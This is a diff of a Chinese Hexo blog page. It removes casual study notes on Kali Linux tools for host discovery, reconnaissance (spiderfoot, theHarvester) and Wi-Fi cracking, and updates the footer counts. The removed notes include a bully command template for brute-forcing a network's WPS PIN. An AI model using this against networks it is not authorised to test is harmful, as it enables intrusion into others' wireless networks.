-  - md你快有个卵子用，扫不出来端口存活信息啊
-
-- **thcping6**：
-
-  - 针对IPV6的发包工具，隶属于atk6这个这个工具包下，官方描述是sends a hand crafted ping6 packet，就是手动构造一个ping6的数据包
-  - 学了IPV6再来
-
-### 路由分析
-
-- **netdiscover**：
-  
-  - 二层发现工具，拥有主动和被动发现两种方式，通过ARP路由表探测
-  - 最简单的就是直接输入netdiscover之后就是运行它的默认配置然后扫描局域网中所有的机器
-  - 也可以直接输入网卡让他自己跑两层
-  - 每天一个被打电话小技巧
-  
-- **netmask**：
-
-  - netmaks可以在 IP范围、子网掩码、cidr、cisco等格式中互相转换，并且提供了IP地址的点分十进制、16进制、8进制、2进制之间的互相转换
-
-  - &#96;&#96;&#96;
-    Usage: netmask spec [spec ...]
-      -h, --help                    Print a summary of the options
-      -v, --version                 Print the version number
-      -d, --debug                   Print status&#x2F;progress information
-      -s, --standard                Output address&#x2F;netmask pairs
-      -c, --cidr                    Output CIDR format address lists
-      -i, --cisco                   Output Cisco style address lists
-      -r, --range                   Output ip address ranges
-      -x, --hex                     Output address&#x2F;netmask pairs in hex
-      -o, --octal                   Output address&#x2F;netmask pairs in octal
-      -b, --binary                  Output address&#x2F;netmask pairs in binary
-      -n, --nodns                   Disable DNS lookups for addresses
-      -f, --files                   Treat arguments as input files
-    Definitions:
-      a spec can be any of:
-        address
-        address:address
-        address:+address
-        address&#x2F;mask
-      an address can be any of:
-        N           decimal number
-        0N          octal number
-        0xN         hex number
-        N.N.N.N     dotted quad
-        hostname    dns domain name
-      a mask is the number of bits set to one from the left<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>这个看官方文档吧</p>
-</li>
-</ul>
-</li>
-</ul>
-
-        <h3 id="情报分析"   >
-          <a href="#情报分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#情报分析" class="headerlink" title="情报分析"></a>情报分析</h3>
-      <ul>
-<li><p><strong>spiderfoot</strong>：</p>
-<ul>
-<li>一个可以自动进行大量查询的工具</li>
-<li>启动需要指定好监听的IP和端口，然后浏览器直接访问就行啦</li>
-<li>好用的耶，一些资产搜寻不用手动做了，而且还可以没事搜搜自己来保护自己</li>
-</ul>
-</li>
-<li><p><strong>theHarvester</strong>：</p>
-<ul>
-<li><p>这个嘛就是一个手动的搜索工具啦，直接看官方文档就好</p>
-</li>
-<li><p>```<br>-d    –domain                    要搜索的公司名称或域名。<br>-l    –limit                        限制搜索结果的数量，默认=500。<br>-S    –start                        从结果编号 X 开始，默认 = 0。<br>-g    –google-dork            使用 Google Dorks 进行 Google 搜索。<br>-p    –proxies                    对请求使用代理，在 proxies.yaml 中输入代理<br>-s    –shodan                    使用 Shodan 查询发现的主机。<br>–screenshot                    对已解析的域进行截图，指定输出目录：–screenshot output_directory<br>-v    –virtual-host        通过 DNS 解析验证主机名并搜索虚拟主机。<br>-e    –dns-server            用于查找的 DNS 服务器。<br>-f    –filename                将结果保存到 XML 和 JSON 文件。<br>-b    –source                    指定搜索的引擎和数据源</p>
-<p>#theHarvester -d [url] -l 300 -b [搜索引擎名称]</p>
-<pre class="line-numbers language-none"><code class="language-none">
-  - 没上一个自动化的好用，不开心😒
-
-## 漏洞分析
-
-### Fuzzing工具集
-
-
-
-
-
-
-
-
-
-
-
-
-
-## Web程序
-
-## 数据库评估软件
-
-## 密码攻击
-
-## 无线攻击
-
-### 蓝牙工具集
-
-### 无线工具集
-
-- **bully**：
-
-  - Wi-Fi破解，通过爆破WPS模式下7位长度PIN值来获取Wi-Fi密码
-
-  - 使用方法
-
-  - &#96;&#96;&#96;shell
-    bully 监听模式网卡名 -b 目标BSSID -e 目标SSID -c 目标广播信道<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>可以看到有许多参数，他们的获取方式我们会在后面提到</p>
-</li>
-<li><p>还没有试过，改天尝试一下</p>
-</li>
-</ul>
-</li>
-<li><p><strong>Fern WiFi Cracker</strong>：</p>
-<ul>
-<li>图形化的Wi-Fi破解工具，可以通过破解路由到设备的加密包来实现Wi-Fi密码解析</li>
-<li>等我笔记本kali装好的（</li>
-</ul>
-</li>
-</ul>
-
-        <h2 id="逆向工程"   >
-          <a href="#逆向工程" class="heading-link"><i class="fas fa-link"></i></a><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2>
-      
-        <h2 id="漏洞利用工具集"   >
-          <a href="#漏洞利用工具集" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用工具集" class="headerlink" title="漏洞利用工具集"></a>漏洞利用工具集</h2>
-      
-        <h2 id="嗅探-欺骗"   >
-          <a href="#嗅探-欺骗" class="heading-link"><i class="fas fa-link"></i></a><a href="#嗅探-欺骗" class="headerlink" title="嗅探/欺骗"></a>嗅探/欺骗</h2>
-      
-        <h3 id="网络欺骗"   >
-          <a href="#网络欺骗" class="heading-link"><i class="fas fa-link"></i></a><a href="#网络欺骗" class="headerlink" title="网络欺骗"></a>网络欺骗</h3>
-      <ul>
-<li><strong>sslsplit</strong>：</li>
-</ul>
-<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/head.png" alt="avatar"></div><p class="sidebar-ov-author__text">生命不息，折腾不止！</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/zhisenyu" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://www.youtube.com/channel/UCarZXyGTzWssmNANey0TC3g" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a><a class="sidebar-ov-social-item" href="z405454586" target="_blank" rel="noopener" data-popover="微信" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="tencent://message?uin=405454586" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">72</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">11</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>J1an</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.0.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>已经是Dest0g3的菜狗了</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="150" zIndex="-1"></script><script>function initSearch() {
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/head.png" alt="avatar"></div><p class="sidebar-ov-author__text">生命不息，折腾不止！</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/zhisenyu" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://www.youtube.com/channel/UCarZXyGTzWssmNANey0TC3g" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a><a class="sidebar-ov-social-item" href="z405454586" target="_blank" rel="noopener" data-popover="微信" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="tencent://message?uin=405454586" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">73</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">11</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>J1an</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.0.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>已经是Dest0g3的菜狗了</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="150" zIndex="-1"></script><script>function initSearch() {
   var isXML = true;
   var search_path = 'search.xml';
 
